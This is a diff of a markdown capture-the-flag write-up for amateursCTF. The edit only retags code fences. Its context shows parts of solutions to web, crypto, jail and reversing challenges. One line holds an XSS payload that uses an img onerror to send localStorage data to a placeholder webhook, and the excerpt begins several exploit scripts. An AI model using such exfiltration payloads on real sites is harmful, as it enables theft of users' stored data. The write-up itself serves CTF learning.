@@ -22,7 +22,7 @@ I played as solo player and got the rank higher than i expected lul. I have lear
 ### **1. web/denied**
 ![image](https://hackmd.io/_uploads/SJlJ6rLgA.png)
 They give me a source code `index.js` so let's take a look on that.
-```javascript!=
+```js
 const express = require('express')
 const app = express()
 const port = 3000
@@ -51,7 +51,7 @@ Flag: `amateursCTF{jk_i_lied_whats_a_bathroom_0f9e8d7c6b5a4321}`
 ![image](https://hackmd.io/_uploads/HJWmgILlA.png)
 The chall gives me a key and a ciphertext and just use that to decrypt the flag.
 Script to exploit:
-```python!=
+```py
 from Crypto.Cipher import AES
 from binascii import unhexlify
 
@@ -87,7 +87,7 @@ Flag: `amateursctf{0k_but_1_dont_like_the_jbmon0_===}`
 ![image](https://hackmd.io/_uploads/SkayU8Ue0.png)
 
 The source code:
-```python!=
+```py
 from flask import Flask, request, make_response
 import sqlite3
 import os
@@ -185,7 +185,7 @@ This challenge has 3 way to solve and i solve with the easiest way.
 
 Exploit script:
 
-```python!=
+```py
 import requests
 from bs4 import BeautifulSoup
 
@@ -220,7 +220,7 @@ Flag: `amateursCTF{l00k1ng_l0v3ly_1n_4k}`
 ### **7. jail/sansomega**
 ![image](https://i.ibb.co/TW5PpZY/image-2024-04-13-113406029.png)
 The source code: 
-```python!=
+```py
 #!/usr/local/bin/python3
 import subprocess
 
@@ -260,7 +260,7 @@ Flag: `amateursCTF{pic0_w45n7_g00d_n0ugh_50_i_700k_som3_cr34t1v3_l1b3rt135_ade88
 
 The challenge give me a file `mian.py` ? It's make me confuse because the variable they name so complex so i need to change the source to see it easily lul.
 Source code (After change):
-```python!=
+```py
 import random as lib
 seed = int('1665663c', 20)
 lib.seed(seed)
@@ -305,7 +305,7 @@ print(var_5.hex())
 
 I do not play Reverse Engineer much so i just do bottom up and reverse the function to recover the flag.
 Script:
-```python!=
+```py
 import random as lib
 seed = int('1665663c', 20)
 lib.seed(seed)
@@ -379,7 +379,7 @@ Flag: `amateursCTF{4t_l3ast_th15_fl4g_isn7_misspelll3d}`
 
 Source code:
 Index.html
-```html!=
+```html
 <html> 
 <head> 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js" type="text/javascript"></script> 
@@ -453,7 +453,7 @@ print "Hello World"
 </html> 
 ```
 Admin-bot-excerpt.js
-```javascript!=
+```javascript
 // bot powered by the redpwn admin bot ofc
 ['sculpture', {
     name: 'sculpture',
@@ -491,7 +491,7 @@ But it not alert anything. It seems weird althought it show in elements. After s
 ![image](https://i.ibb.co/K5CP8hv/image-2024-04-13-113458993.png)
 
 And yes it works so let just build xss payload. Payload: `print("<img src=x onerror=window.location.href='<YOUR WEBHOOK>?flag='+localStorage.getItem('flag')>")`
-```javascript!=
+```javascript
 document.addEventListener("DOMContentLoaded",function(ev){
     document.getElementById("yourcode").value = atob((new URLSearchParams(location.search)).get("code"));
     runit();
@@ -536,7 +536,7 @@ Flag: `amateursCTF{s1gn1ng_a1nt_g0nna_st0p_0ur_brut3}`
 ![image](https://i.ibb.co/D44hjfw/image-2024-04-13-113539154.png)
 
 Source code:
-```javascript!=
+```java
 package team.amateurs.loginpage;
 
 import jakarta.servlet.http.Cookie;
@@ -691,7 +691,7 @@ Let breakdown the code:
 * @GetMapping(value = "/login", produces = MediaType.TEXT_HTML_VALUE): Handles GET requests to the login page. It retrieves the login HTML file from a static location and returns its content.
 
 The template method seems to be a custom function that performs string interpolation using double curly braces `({{}})`. It retrieves values from class fields with matching names. However, its implementation has security vulnerabilities as it doesn't properly validate field types or access restrictions. So that we can input `{{flag}}` to get the flag. 
-```java!=
+```java
 public String flag = System.getenv("FLAG");
 ```
 The idea that i use to solve is [this one](https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length/184090#184090). 
@@ -703,7 +703,7 @@ So the maximum length of the bcrypt password is 72 bytes. so the idea is i regis
 
 The exploit script:
 
-```python!=
+```py
 import requests
 import string
 import os
